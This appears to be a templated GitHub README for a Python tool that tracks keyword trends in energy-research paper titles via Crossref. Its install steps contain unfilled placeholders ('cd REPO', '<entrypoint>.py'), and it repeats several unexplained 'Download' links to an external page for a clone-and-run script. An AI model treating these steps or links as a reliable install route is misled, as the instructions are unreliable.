# Energy Research Trend Tracker - Research Analytics Tool 2026

> **Energy Research Trend Tracker is a Python analytics utility that watches new energy and materials science literature, quantifies keyword patterns in titles across time, and emits JSON suited to dashboards and interactive exploration.**

[![Platform](https://img.shields.io/badge/Platform-Python-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Not%20specified-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/theof93/energy-pubs-trend-tracker?style=flat-square)](https://github.com/theof93/energy-pubs-trend-tracker)

---

<p align="center">
  <a href="https://theof93.github.io/energy-pubs-trend-tracker/">
    <img src="https://img.shields.io/badge/Download-Energy%20Research%20Trend%20Tracker%20Latest-brightgreen?style=for-the-badge" alt="Download Energy Research Trend Tracker">
  </a>
</p>

> **[Download - Energy Research Trend Tracker](https://theof93.github.io/energy-pubs-trend-tracker/)**

---

[Download Latest Build](https://theof93.github.io/energy-pubs-trend-tracker/)

---

## What this project does

Energy Research Trend Tracker pulls recent articles from a fixed list of energy and materials journals via the Crossref API. Titles are cleaned, broken into terms, and folded into a running keyword history so shifts in research emphasis stay visible run after run.

It is aimed at researchers, analysts, science communicators, and anyone wiring publication watchers into larger pipelines. Because results leave the tool as JSON, charting, word clouds, and other UI work can live entirely outside the collector.

---

## Capabilities

- Pulls recent articles from chosen journals through Crossref
- Avoids recounting the same paper by storing DOIs between runs
- Normalizes and tokenizes titles before frequency work
- Maintains a growing keyword-frequency timeline as jobs repeat
- Writes top keywords plus first-seen terms out as JSON
- Feeds structured payloads into charts, dashboards, and word clouds
- Fits cron or GitHub Actions for unattended schedules
- Stays scoped to energy research and materials science outlets

---

## Installation

Clone the repo and enter the project folder:

```bash
git clone https://github.com/theof93/energy-pubs-trend-tracker.git
cd REPO
```

Create a virtual environment, activate it, and install dependencies from the project lock list:

```bash
python -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
```

On Windows PowerShell, activation looks like this:

```powershell
.venv\Scripts\Activate.ps1
```

Start the tool with the repository entry point that matches your layout:

```bash
python <entrypoint>.py
```

For hands-off collection, call that same command from cron or a GitHub Actions job.

---

## Usage

An end-to-end pass usually follows this path:

1. Decide which journals and publication window to watch.
2. Launch the tracker once or on a fixed schedule.
3. Request recent metadata from Crossref.
4. Drop any paper whose DOI is already on file.
5. Clean and tokenize titles.
6. Refresh cumulative keyword tallies.
7. Emit dashboard-oriented JSON with leading terms and newly noticed words.
8. Point a chart or word-cloud UI at that JSON.

Locally, invoke the configured entry point:

```bash
python <entrypoint>.py
```

You can pipe the JSON into a frontend or open it with ordinary JSON utilities.

---

## Configuration

Journals, schedule, output paths, and analysis knobs live in the project config file or workflow definition already checked into the repo.

An illustrative snippet:

```json
{
  "journals": [
    "Journal Name"
  ],
  "lookback_days": 7,
  "output_file": "dashboard.json",
  "doi_store": "seen_dois.json"
}
```

Keep the DOI store intact between runs. Wiping it each time will make previously seen papers look new again.

For timed collection, register the command in cron or define a GitHub Actions workflow at the interval you need.

---

## Requirements

- A working Python install
- Outbound network reachability to the Crossref API
- Permission to read the journal metadata you configured
- Disk space you can write for the DOI cache and JSON exports
- cron, GitHub Actions, or another scheduler if you want recurring runs
- Optional chart or word-cloud tooling on the presentation side

---

## FAQ

### Does the tracker download full papers?

No. It works from Crossref metadata and titles. Full-text fetch is outside the keyword workflow described here.

### How are duplicate publications handled?

Persistent DOI records mark papers already seen. Matching DOIs on later runs are skipped as new discoveries.

### Can I run it without GitHub Actions?

Yes. Manual runs and other schedulers (including cron) are supported.

### Where does the dashboard data go?

JSON with keyword stats and newly observed words is written to the output path you configure.

### Why are no new papers appearing?

Verify connectivity, journal settings, lookback window, and the DOI history file. Quiet periods also happen when monitored sources simply publish nothing in scope.

### How can I change the journals being monitored?

Edit the journal list in config or workflow settings, then run the tracker so the new sources are queried.

### How do I get updates?

Watch the repository for commits and workflow edits, refresh your local clone, and run the updated code.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
